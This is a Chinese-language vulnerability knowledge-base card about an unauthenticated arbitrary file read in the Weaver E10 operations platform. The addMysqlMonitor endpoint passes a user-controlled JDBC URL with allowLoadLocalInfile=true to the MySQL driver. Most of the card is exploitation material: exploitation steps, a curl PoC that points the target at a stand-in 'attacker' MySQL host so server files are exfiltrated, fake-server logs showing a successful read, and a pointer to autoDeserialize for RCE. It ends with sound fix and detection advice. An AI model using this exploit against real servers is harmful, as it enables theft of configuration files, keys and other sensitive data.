---
id: web-java-component-weaver-e10-addmysqlmonitor-jdbc-local-infile-read
title: 泛微 E10 addMysqlMonitor 未授权 JDBC URL：allowLoadLocalInfile=true + 恶意 MySQL 服务端读取服务器文件
type: scenario
domain: web
path: web/java/component
technique: weaver-e10-addmysqlmonitor-jdbc-local-infile-read
tags:
- java
- jdbc
- mysql
- allowLoadLocalInfile
- arbitrary-file-read
- weaver
- ecology
- e10
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T06:44:39+08:00'
  notes: '已对照原文 ToolControl/MysqlService/MysqlUtil 反编译及 fake MySQL 日志（read file/ssrf result: D:/1.txt, write 12 byte success）核对；/sapi/bs 未授权与 /cp 带 token 两个入口均与原文一致。'
url: /docs/web/java/component/web-java-component-weaver-e10-addmysqlmonitor-jdbc-local-infile-read/
draft: false
kb_aliases:
- 泛微 E10 JDBC 任意文件读取
- addMysqlMonitor allowLoadLocalInfile
- MySQL LOAD DATA LOCAL INFILE 读文件
- e-monitor JDBC 注入
---

## 一句话结论

泛微 E10 运维平台的 `/sapi/bs/addMysqlMonitor.json`（未授权）与 `/cp/addMysqlMonitor.json` 接受用户提供的 JDBC URL，并调用 `DriverManager.getConnection` 测试连接；攻击者把 URL 指向自建恶意 MySQL 服务端并带上 `allowLoadLocalInfile=true`，即可让应用服务器读取本地任意文件并发送到攻击者服务器，形成任意文件读取。

## 原理

- 入口 `ToolControl.doPost` 的 `addMysqlMonitor.json` 分支：
  ```java
  int status12 = this.mysqlService.testMysqlConnection(requestBody.get("url") + "", requestBody.get("name") + "", requestBody.get("paw") + "");
  if (status12 == 0) return -3;
  int result2 = this.mysqlService.addMysqlMonitor(...);
  ```
- `MysqlService.testMysqlConnection` → `MysqlUtil.testMysql(url, name, paw)` → `getConnection`：
  ```java
  Class.forName("com.mysql.jdbc.Driver");
  conn = DriverManager.getConnection(url, name, paw);
  ```
  JDBC URL 完全可控，驱动类固定为 MySQL（`com.mysql.jdbc.Driver`）。
- MySQL JDBC 驱动的 `allowLoadLocalInfile=true` 会允许服务端通过 `LOAD DATA LOCAL INFILE` 请求客户端读取本地文件并回传。攻击者控制的 MySQL 服务端在握手后发送 LOCAL INFILE 请求，指定 `D:/1.txt` 等服务器路径，驱动即读取该文件并发送给恶意服务端。
- 文章用自建 fake MySQL 服务端验证：日志显示 `read file/ssrf result: D:/1.txt`，并把 12 字节内容写入攻击者本地 `1.txt`，证明应用服务器上的文件被读出。
- `/sapi/bs/addMysqlMonitor.json` 命中 `/sapi/bs/**` 白名单，未授权即可触发；`/cp/addMysqlMonitor.json` 则需要登录 token，但可配合全局鉴权绕过或已有后台会话。

## 触发条件

- 目标为泛微 E10 运维管理平台（文章测试 Ecology10.0.2403.01），`/sapi/bs/addMysqlMonitor.json` 可达。
- 应用服务器能出站连接攻击者的 MySQL 端口（默认示例 3308/3306）；若不出网，此链不可用。
- 目标使用 MySQL JDBC 驱动且版本支持 `allowLoadLocalInfile=true`（较新的驱动默认可能禁用，需显式开启或依赖旧版默认）。
- 攻击者拥有可控的 MySQL 服务端（可自行实现握手与 LOCAL INFILE 请求）。

## 利用步骤

1. 在公网/可控主机启动恶意 MySQL 服务端，监听端口（如 3308），配置为连接后请求 `LOAD DATA LOCAL INFILE 'D:/1.txt'`。
2. 向目标发送：
   ```json
   {"url":"jdbc:mysql://attacker:3308/mysql?useSSL=false&serverTimezone=UTC&characterEncoding=UTF-8&allowLoadLocalInfile=true","name":"f7cd55e","paw":""}
   ```
   到 `/sapi/bs/addMysqlMonitor.json`（未授权）或 `/cp/addMysqlMonitor.json`（带 token）。
3. 恶意 MySQL 端接收客户端回传的文件内容，保存为本地文件。
4. 重复读取配置、密钥、日志等敏感文件；结合路径穿越/配置泄露获取更多路径。

## PoC

```bash
# 目标端请求（未授权入口）
curl -s -X POST 'http://target:9081/sapi/bs/addMysqlMonitor.json' \
  -H 'Content-Type: application/json' \
  -d '{"url":"jdbc:mysql://attacker:3308/mysql?useSSL=false&serverTimezone=UTC&characterEncoding=UTF-8&allowLoadLocalInfile=true","name":"f7cd55e","paw":""}'
```

恶意 MySQL 服务端可用现成的 fake-mysql / MySQL-Fake-Server 类工具，日志应出现类似：

```text
ReadFileResolver - read file/ssrf result: D:/1.txt
ReadFileResolver - write 12 byte to '.../1.txt' success
```

## 变体与关联

- **其他 JDBC 参数**：`autoDeserialize=true` 可进一步尝试反序列化 RCE（取决于驱动版本与 classpath）；`allowLoadLocalInfile` 也可配合 `allowUrlInLocalInfile`。
- **其他驱动**：文章尝试 PG `socketFactory` 注入但目标驱动版本较高未成功；不同驱动/版本有不同的攻击面。
- **关联**：[[web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read]]（同为恶意 MySQL 服务端 LOAD DATA LOCAL INFILE 读文件，本卡为泛微 E10 产品入口）、[[web-java-component-weaver-ecology-jdbc-socketfactory-memshell]]（泛微 e-cology 的 JDBC socketFactory 加载链，可对比）。

## 检测与防御

- **修复**：禁止用户完全控制 JDBC URL；使用固定驱动、固定主机/端口与参数白名单；强制 `allowLoadLocalInfile=false`，并禁用 `autoDeserialize`、`allowUrlInLocalInfile` 等危险参数；服务端不要用可控 URL 直接 `DriverManager.getConnection` 做“测试连接”。
- **加固**：测试连接功能限制在管理员且做目标地址白名单；出站流量限制到必要网段。
- **检测**：监控 `/sapi/bs/addMysqlMonitor.json`、`/cp/addMysqlMonitor.json` 的 URL 参数中出现 `allowLoadLocalInfile`、`autoDeserialize`、外部 IP/域名；审计应用服务器向外部 MySQL 端口的出站连接与异常文件读取。
